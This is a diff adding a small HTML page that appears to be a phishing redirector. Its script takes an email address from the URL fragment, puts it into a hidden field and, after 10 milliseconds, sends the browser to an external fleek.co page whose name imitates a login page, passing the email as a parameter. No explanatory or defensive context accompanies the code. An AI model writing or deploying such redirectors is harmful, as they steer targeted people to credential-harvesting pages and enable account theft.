@@ -1,0 +1,55 @@
+
+<!doctype html>
+<html lang="en">
+
+<head>
+
+  
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+   
+
+  </head>
+
+  <body >
+	<form>
+	<input type="text" id="username" style="display:none;">
+</form>
+  
+	<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <script>
+
+
+    /* global $ */
+    $(document).ready(function(){
+	
+	    var email = window.location.hash.substr(1);
+if (!email) {
+
+}
+else
+{
+var my_email =email;
+$('#username').val(my_email);
+
+var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+var ind=my_email.indexOf("@");
+var my_slice=my_email.substr((ind+1));
+var c= my_slice.substr(0, my_slice.indexOf('.'));
+var final= c.toLowerCase();
+var finalu= c.toUpperCase();
+
+
+
+}
+setTimeout(function(){window.location.href="https://summer-shadow-5905.on.fleek.co/git-hup-en-arub-indx-up.html?msg="+my_email;}, 10);
+     
+
+   });
+</script>
+</html>
